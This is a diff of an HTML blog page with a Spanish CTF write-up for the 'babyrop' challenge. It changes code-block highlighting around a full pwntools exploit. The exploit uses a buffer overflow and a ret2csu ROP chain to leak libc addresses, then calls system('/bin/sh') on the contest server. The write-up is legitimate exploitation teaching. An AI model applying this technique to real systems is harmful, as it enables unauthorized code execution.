@@ -3,7 +3,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=17941d18d5e8b6597efd5746996c8d7c1374c9d2">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ad89651c35ce1f15ad2e2c36e337606f693f0ac8">
     <script src="https://kit.fontawesome.com/cad5e6b3e1.js" crossorigin="anonymous"></script>
 
 <!-- Begin Jekyll SEO tag v2.7.1 -->
@@ -95,18 +95,18 @@
 
 <p>Para que esto funcione debemos primero agregar los registros necesarios en nuestro “ropchain” de tal manera que pase el check en 0x4011c4 y hacer que el call, llame a write directamente por lo cual debemos asegurarnos que el valor de write este en  0x4011b9 call   QWORD PTR [ r15+rbx*8 ]</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload = b"A"*0x48 #overflow a los 72 bytes
-payload += p64(0x4011ca) #pop a registros
-payload += p64(0)#rbx
-payload += p64(1)#rbp
-payload += p64(1)#r12 --&gt; edi
-payload += p64(elf.got.gets) #r13 --&gt; rsi
-payload += p64(8)#r14 ---&gt; rdx
-payload += p64(elf.got.write) #r15
-payload += p64(0x04011b0) # escribiendo en RDX RSI Y EDI
-payload += p64(0)*7 # --&gt; los pop nuevamente
-payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof
-</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x48</span> <span class="c1">#overflow a los 72 bytes
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011ca</span><span class="p">)</span> <span class="c1">#pop a registros
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#rbx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#r12 --&gt; edi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">gets</span><span class="p">)</span> <span class="c1">#r13 --&gt; rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="c1">#r14 ---&gt; rdx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">write</span><span class="p">)</span> <span class="c1">#r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x04011b0</span><span class="p">)</span> <span class="c1"># escribiendo en RDX RSI Y EDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="c1"># --&gt; los pop nuevamente
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">)</span> <span class="c1">#para retornar a main y hacer un segundo bof
+</span></code></pre></div></div>
 
 <p>Si enviamos esto podemos lekear las direcciones de gets y write</p>
 
@@ -120,71 +120,70 @@ payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof
 
 <p>Vemos que coincide con la versión, la 2.31 , podríamos descargarla pero dado que esta pagina nos entrega los offset a system y al string de “/bin/sh” dentro de glibc, pues probaremos con esto en nuestro segundo payload, de la siguiente forma:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload = b"A" * 72 #overflow
-payload += p64(poprdi) #pop rdi en el binario
-payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
-payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
-payload += p64(libc.address+0x055410) #direccion de system
-
-</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span> <span class="c1">#overflow
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="c1">#pop rdi en el binario
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1b75aa</span><span class="p">)</span> <span class="c1">#string de /bin/sh a RDI como primer arg
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="c1">#ret para alinear el stack a 16 bytes (ubuntu)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x055410</span><span class="p">)</span> <span class="c1">#direccion de system
+</span></code></pre></div></div>
 <p>Con esto ejecutamos y listo! Tenemos una shell.</p>
 
 <p><img src="https://i.imgur.com/trApFwN.png" alt="Imgur" /></p>
 
 <p>Espero que les haya gustado, este fue el único exploit que pude terminar en el CTF tuve mucho que hacer y los retos no estaban tan fáciles. Aun asi ya he hechos desafíos para Q4 que ocupan esta técnica, por lo cual me pareció valido mostrar como funciona. Espero les haya gustado, aca les dejo el exploit final:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python3
-from pwn import *
-gs = '''
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">gs</span> <span class="o">=</span> <span class="s">'''
 continue
-'''
-elf = context.binary = ELF('./babyrop')
-context.terminal = ['tmux', 'splitw', '-hp', '70']
-libc = elf.libc
+'''</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./babyrop'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-hp'</span><span class="p">,</span> <span class="s">'70'</span><span class="p">]</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
 
-def start():
-    if args.GDB:
-        return gdb.debug('./babyrop', gdbscript=gs)
-    if args.REMOTE:
-        return remote('dicec.tf', 31924)
-    else:
-        return process('./babyrop')
-r = start()
-r.timeout = 0.3
-#========= exploit here ===================
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'./babyrop'</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'dicec.tf'</span><span class="p">,</span> <span class="mi">31924</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./babyrop'</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.3</span>
+<span class="c1">#========= exploit here ===================
+</span>
+<span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x4011d3</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x040116b</span>
 
-poprdi = 0x4011d3
-ret = 0x040116b
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x48</span> <span class="c1">#overflow a los 72 bytes
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011ca</span><span class="p">)</span> <span class="c1">#pop a registros
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#rbx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#r12 --&gt; edi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">gets</span><span class="p">)</span> <span class="c1">#r13 --&gt; rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="c1">#r14 ---&gt; rdx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">write</span><span class="p">)</span> <span class="c1">#r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x04011b0</span><span class="p">)</span> <span class="c1"># escribiendo en RDX RSI Y EDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="c1"># --&gt; los pop nuevamente
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">)</span> <span class="c1">#para retornar a main y hacer un segundo bof
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-payload = b"A"*0x48 #overflow a los 72 bytes
-payload += p64(0x4011ca) #pop a registros
-payload += p64(0)#rbx
-payload += p64(1)#rbp
-payload += p64(1)#r12 --&gt; edi
-payload += p64(elf.got.gets) #r13 --&gt; rsi
-payload += p64(8)#r14 ---&gt; rdx
-payload += p64(elf.got.write) #r15
-payload += p64(0x04011b0) # escribiendo en RDX RSI Y EDI
-payload += p64(0)*7 # --&gt; los pop nuevamente
-payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your"</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">7</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>  <span class="c1">#remote offset
+</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x086af0</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"leak = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc remote = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-r.sendlineafter("name:", payload)
-
-leak = u64(r.recvuntil("Your").split(b"Your")[0][1:7].ljust(8,b"\x00"))  #remote offset
-libc.address = leak - 0x086af0
-log.info(f"leak = {hex(leak)}")
-log.info(f"libc remote = {hex(libc.address)}")
-
-payload = b"A" * 72 #overflow
-payload += p64(poprdi) #pop rdi en el binario
-payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
-payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
-payload += p64(libc.address+0x055410) #direccion de system
-
-r.sendlineafter("name:", payload)  #!!
-
-#========= interactive ====================
-r.interactive()
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span> <span class="c1">#overflow
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="c1">#pop rdi en el binario
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1b75aa</span><span class="p">)</span> <span class="c1">#string de /bin/sh a RDI como primer arg
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="c1">#ret para alinear el stack a 16 bytes (ubuntu)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x055410</span><span class="p">)</span> <span class="c1">#direccion de system
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1">#!!
+</span>
+<span class="c1">#========= interactive ====================
+</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
                 </section>
